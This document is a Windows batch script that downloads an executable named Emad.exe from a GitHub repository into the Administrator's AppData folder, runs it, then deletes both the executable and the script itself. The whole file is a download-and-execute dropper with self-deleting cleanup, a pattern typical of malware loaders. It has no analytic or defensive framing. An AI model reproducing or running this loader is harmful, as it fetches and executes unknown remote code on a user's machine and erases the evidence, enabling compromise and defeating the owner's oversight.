@echo off
:: Set the download directory
set DOWNLOAD_DIR=C:\Users\Administrator\AppData\Roaming\

:: Ensure the download directory exists
if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"

:: Download the executable file to the specified directory
powershell -Command "Invoke-WebRequest -Uri https://github.com/emad8787/panel/raw/refs/heads/main/Emad.exe -OutFile '%DOWNLOAD_DIR%\Emad.exe'"

:: Run the executable
start "" "%DOWNLOAD_DIR%\Emad.exe"

:: Wait for the executable to finish before deleting the files
timeout /t 5 /nobreak >nul

:: Delete the downloaded executable file
del "%DOWNLOAD_DIR%\Emad.exe"

:: Delete the .bat file itself after execution
del "%~f0"
